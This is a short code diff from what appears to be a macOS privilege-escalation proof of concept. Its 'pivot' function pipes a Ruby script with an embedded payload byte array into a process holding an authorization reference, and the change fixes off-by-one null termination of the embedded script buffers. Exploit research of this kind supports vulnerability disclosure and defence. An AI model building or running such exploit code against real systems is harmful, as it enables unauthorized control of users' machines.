@@ -216,11 +216,12 @@ static void pivot(AuthorizationRef authorization) {
   fprintf(commPipe, "REAL_SCRIPT=String.new(<<'EOF')\n");
   p0_logf(P0_INFO, "P=[%s].pack('c*')\n", rubella_payload);
   fprintf(commPipe, "P=[%s].pack('c*')\n", rubella_payload);
+  pivot_rb[pivot_rb_len - 1] = '\0';
   p0_logf(P0_INFO, "%s", pivot_rb);
   fprintf(commPipe, "%s", pivot_rb);
   p0_logf(P0_INFO, "EOF\n");
   fprintf(commPipe, "EOF\n");
-  rerun_rb[rerun_rb_len] = '\0';
+  rerun_rb[rerun_rb_len - 1] = '\0';
   p0_logf(P0_INFO, "%s\n", rerun_rb);
   fprintf(commPipe, "%s\n", rerun_rb);
   fclose(commPipe);
